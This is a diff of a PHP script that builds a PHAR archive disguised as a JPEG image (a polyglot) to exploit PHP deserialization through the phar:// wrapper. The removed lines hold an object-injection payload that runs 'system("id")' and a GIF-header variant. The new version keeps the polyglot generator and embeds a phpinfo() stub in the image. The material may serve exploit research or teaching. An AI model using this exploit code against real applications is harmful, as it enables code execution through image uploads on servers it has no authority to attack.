@@ -1,14 +1,13 @@
 <?php
 
 
-function generate_base_phar($o, $prefix){
+function generate_base_phar(){
     global $tempname;
     @unlink($tempname);
     $phar = new Phar($tempname);
     $phar->startBuffering();
     $phar->addFromString("test.txt", "test");
-    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
-    $phar->setMetadata($o);
+    $phar->setStub("<?php phpinfo(); __HALT_COMPILER(); ?>");
     $phar->stopBuffering();
     
     $basecontent = file_get_contents($tempname);
@@ -33,36 +32,10 @@ function generate_polyglot($phar, $jpeg){
     return $contents;
 }
 
-
-// pop exploit class
-class PHPObjectInjection {}
-$object = new PHPObjectInjection;
-$object->inject = 'system("id");';
-$object->out = 'Hallo World';
-
-
-
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
 $jpeg = file_get_contents('in.jpg');
 $outfile = 'out.jpg';
-$payload = $object;
-$prefix = '';
-
-var_dump(serialize($object));
-
-
 // make jpg
-file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));
-
-/*
-// config for gif
-$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
-$tempname = 'temp.phar'; // make it phar
-$outfile = 'out.gif';
-
-// make gif
-file_put_contents($outfile, generate_base_phar($payload, $prefix));
-
-*/
+file_put_contents($outfile, generate_polyglot(generate_base_phar(), $jpeg));
 
